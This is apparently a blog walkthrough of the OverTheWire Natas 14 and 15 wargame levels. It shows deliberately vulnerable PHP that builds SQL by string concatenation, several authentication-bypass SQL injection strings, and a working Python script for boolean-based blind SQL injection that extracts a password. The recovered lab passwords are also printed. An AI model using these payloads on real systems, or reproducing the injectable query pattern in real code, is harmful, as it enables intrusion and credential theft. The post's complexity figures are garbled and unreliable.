---
layout: post
title: "OverTheWire: Natas 14 and 15"
date: 2016-11-15 12:00:00
share: true
comments: true
tags: [OverTheWire - Natas]
---

Starting this challenge, we'll be doing some fun SQL injection challenges. You may want to read about SQL, Regex and Python for easier understanding.

## Natas 14

Taking a look at the source code shows how the query is generated:

```php
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>
```


Query:
```sql
SELECT * from users where username="someusername" and password="somepassword"
```

You'll notice that the user input is not being filtered, which means we can use escape characters to make the query act differently than it should be.
Since we're trying to log in as Natas15, let's manipulate the query in a way that will bypass checking for a valid password.

All the following combinations work (among many others):

  * **User**: `natas15" #`
    **Pass**: *empty*
    **Query**:
```sql
    SELECT * from users where username="natas15" # and password =""
```


  * **User**: `" or 1 = 1 #`
    **Pass**: *empty*
    **Query**:
```sql
    SELECT * from users where username="" or 1 = 1 # and password = ""
```

  * **User**: `natas15`
    **Pass**: `" or "1"="1`
    **Query**:
```sql
    SELECT * from users where username="natas15" and password = "" or "1" = "1"
```

Successful login! The password for natas15 is `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`.

_______________________________________________________

## Natas 15

```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```

In this example we'll be introduced to [blind-based SQL injection](https://www.exploit-db.com/docs/17397.pdf), more specifically to boolean based one.
Inspecting the source code above shows us that no data from the database issent directly to us, instead we get 3 types of responses depending on our query.

How can we retrieve the password? By asking questions! Like, does the password contain the letter 'a'? Does the letter 'x' come first?

Python script consists of two steps:

  1. Find a reduced sample size to bruteforce the password (since the number of valid characters is 62, and the password is only 32 characters long) without caring about position.
  2. Use the smaller set to get the exact word, password is an empty string where you keep looping for the next character, append it to the password and repeat, till you get the 32 characters long password.

```python
import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''

for char in chars:
    Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
    if 'exists' in r.text :
        filtered = filtered + char

for i in range(0,32):
    for char in filtered:
        Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
        if 'exists' in r.text :
            passwd = passwd + char
            print(passwd)
            break
```

If we didn't reduce our sample size, code complexity would've been `O(32 ^ 62)`, instead it became `O(62 + 32^25)`, which is much, much faster.

Output:
```
W
Wa
WaI
WaIH
WaIHE
WaIHEa
WaIHEac
WaIHEacj
WaIHEacj6
WaIHEacj63
WaIHEacj63w
WaIHEacj63wn
WaIHEacj63wnN
WaIHEacj63wnNI
WaIHEacj63wnNIB
WaIHEacj63wnNIBR
WaIHEacj63wnNIBRO
WaIHEacj63wnNIBROH
WaIHEacj63wnNIBROHe
WaIHEacj63wnNIBROHeq
WaIHEacj63wnNIBROHeqi
WaIHEacj63wnNIBROHeqi3
WaIHEacj63wnNIBROHeqi3p
WaIHEacj63wnNIBROHeqi3p9
WaIHEacj63wnNIBROHeqi3p9t
WaIHEacj63wnNIBROHeqi3p9t0
WaIHEacj63wnNIBROHeqi3p9t0m
WaIHEacj63wnNIBROHeqi3p9t0m5
WaIHEacj63wnNIBROHeqi3p9t0m5n
WaIHEacj63wnNIBROHeqi3p9t0m5nh
WaIHEacj63wnNIBROHeqi3p9t0m5nhm
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

Natas16 password is `WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`.
